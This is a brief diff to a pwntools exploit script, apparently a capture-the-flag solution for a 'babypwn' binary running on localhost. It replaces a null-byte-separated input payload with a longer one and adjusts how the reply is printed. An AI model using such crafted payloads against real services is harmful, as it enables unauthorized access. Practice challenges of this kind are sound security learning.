@@ -3,8 +3,9 @@ from pwn import *
 # p = process('./files/babypwn')
 p = remote('localhost', 1340)
 
-payload = b'11111111\x0011111111\x00'
+payload = b'111111111111111\x00111111111111111\x00'
 
 p.recvline()
 p.sendline(payload)
-print('\n'+p.recvline().decode())
+p.recvline()
+print('\n', p.recv(), '\n')
